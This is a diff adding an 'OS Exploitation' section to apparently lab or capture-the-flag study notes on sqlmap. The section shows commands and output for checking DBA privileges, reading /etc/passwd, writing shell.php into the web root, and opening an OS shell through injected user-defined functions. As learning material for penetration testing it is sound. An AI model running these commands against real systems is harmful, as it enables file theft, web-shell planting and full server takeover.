@@ -97,3 +97,92 @@ Tamper scripts can be chained, one after another, within the `--tamper` option
 ```bash
 sqlmap -u 'http://94.237.52.208:33673/case11.php?id=1' -T flag11 --batch --dump --tamper between
 ```
+
+# OS Exploitation
+
+SQLMap has the ability to utilize an SQL Injection to read and write files from the local system outside the DBMS.
+
+## DBA Privileges
+
+```bash
+$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+
+
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.4.11#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 17:37:47 /2020-11-19/
+
+[17:37:47] [INFO] resuming back-end DBMS 'mysql'
+[17:37:47] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+current user is DBA: True
+
+[*] ending @ 17:37:48 /2020-11-19/
+```
+
+
+## Reading Local Files
+
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+```
+
+## Writing Local Files
+
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.11#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 17:54:18 /2020-11-19/
+
+[17:54:19] [INFO] resuming back-end DBMS 'mysql'
+[17:54:19] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y
+
+[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
+
+[*] ending @ 17:54:28 /2020-11-19/
+```
+
+## OS Cmd Execution
+
+```bash
+$ sqlmap -u "http://www.example.com/?id=1" --os-shell
+
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.4.11#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[*] starting @ 18:02:15 /2020-11-19/
+
+[18:02:16] [INFO] resuming back-end DBMS 'mysql'
+[18:02:16] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+[18:02:37] [INFO] the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)
+[18:02:37] [INFO] creating UDF 'sys_exec' from the binary UDF file
+[18:02:38] [INFO] creating UDF 'sys_eval' from the binary UDF file
+[18:02:39] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
+[18:02:39] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+
+os-shell> ls -la
+```
